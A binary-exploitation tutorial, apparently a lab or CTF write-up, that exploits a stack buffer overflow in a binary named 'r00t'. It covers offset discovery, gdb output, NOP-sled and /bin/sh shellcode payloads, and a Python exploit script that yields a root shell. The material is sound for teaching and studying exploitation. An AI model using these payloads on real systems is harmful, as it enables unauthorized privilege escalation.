---
title: Buffer Overflow - Shellcode Injection Tutorial
description: A buffer overflow tutorial.
categories:
 - binary exploitation
tags: binary exploitation, bof
---

First step always, let's check binary protections using `checksec.sh`.

```bash
$ wget -q https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec -O /tmp/checksec.sh
$ chmod +x /tmp/checksec.sh
$ /tmp/checksec.sh --file=r00t
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   73 Symbols     No	0		2	r00t
```

Great, this should be easy. Now let's run the binary to check what it does.

```bash
$ ./r00t
Usage: ./r00t input
$ ./r00t test
test
```

Takes an argument and print it. Let's find out if the binary is vulnerable or not by trying to crash it.

```bash
$ ./r00t $(python -c 'print "A" * 300')
Segmentation fault
```

`Segfault` -> accessing memory that does not belong to us.
 
It crashes before 300 bytes, next step is to know where exactly does it crash. (finding the offset, how many chars overwrite EIP)

```bash
$ ./pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

$ gdb -q ./r00t
Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()

$ ./pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268
```

Great offset is 268, after 268 bytes we can overwrite EIP.

EIP (Extended Instruction Pointer) register tells the computer where to go next to execute the next command.

Let's verify that we overwrite EIP.

```bash
(gdb) r $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 20')

Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c 'print "A" * 268 + "B" * 4 + "\x90" * 20')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x124	292
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd1ff4	-1208147980
esp            0xbffffb60	0xbffffb60
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

`0x42 = B`

`\x90 = NOP/no-op is an assembly instruction that does nothing.`

We use NOPS to make sure that our exploit doesn’t fail.

Now let's get the location of ESP.

```bash
(gdb) i r esp
esp            0xbffffb60	0xbffffb60
```

Now let's take some shellcode.

Shellcode is our payload, lot of `\x**` characters together. Shellcode will gives us a shell.

We're on x86 OS :

```bash
(gdb) shell uname -m
i686
```

So we will search for x86 /bin/sh shellcode. We can use this 23bytes one [shellcode /bin/sh](http://shell-storm.org/shellcode/files/shellcode-827.php)

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

So the idea of the exploit will be this :

We will fill the buffer with “A”, we will reach the EIP and overwrite it with a new address that points to our shellcode, then we will add NOPS , and finally the shellcode.

The exploit will look like this :

`"A" * 268 + ESP Location Reversed + NOPS + Shellcode`

When you debugging a binary in gdb or whatever debugger you choose, the actual memory location of everything in that binary might be slightly off, so let's add 1-2 addresses later.

```bash
(gdb) x/250x $esp
0xbffffb60:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb70:	0x90909090	0xbffffb00	0xbffffc00	0x00000000
0xbffffb80:	0x0804823c	0xb7fd1ff4	0x00000000	0x00000000
0xbffffb90:	0x00000000	0x8a38a138	0xbd674528	0x00000000
```

We can use `0xbffffb80` :

```bash
$ ./r00t $(python -c 'print "A" * 268 + "\x80\xfb\xff\xbf" + "\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
# whoami; id
root
```

We have root shell!, we can also code a simple exploit for that.

```python
from struct import pack
 
def p(x):
    return pack('<L', x)

padding = "A" * 268
EIP = p(0xbffffb80)
NOPS = "\x90" * 20
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print padding + EIP + NOPS + shellcode
```

```bash
$ ./r00t $(python /tmp/exp.py)
# whoami
root
```
